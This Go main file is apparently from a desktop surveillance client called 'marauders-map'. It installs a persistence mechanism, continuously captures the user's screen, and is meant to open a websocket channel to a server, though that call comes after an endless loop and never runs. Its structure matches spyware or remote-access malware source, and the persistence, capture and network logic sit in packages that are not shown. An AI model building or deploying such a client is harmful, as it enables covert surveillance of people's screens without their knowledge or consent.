package main

import (
	"log"
	"marauders-map-client-desktop/internal/deploy"
	"marauders-map-client-desktop/internal/screen"
	"marauders-map-client-desktop/internal/wsclient"
)

func main() {

	// Deploy for persistence
	// this setups home directory folder for the program
	// folder strcuture & persist mechanism
	deploy.Deploy()

	ch := make(chan *screen.Screenshot)
	recorder := screen.NewScreenRecorder(5)
	recorder.StartCapturing(ch)

	for {
		shot := <-ch
		log.Println("Shot received: ", shot.FileName)
		log.Printf("Shot name: (%s) %s\n", shot.FileGroup, shot.FileName)
		log.Println("Shot path:", shot.FilePath)
	}

	// Start connection and communication with server
	wsclient.StartCommunications()

}
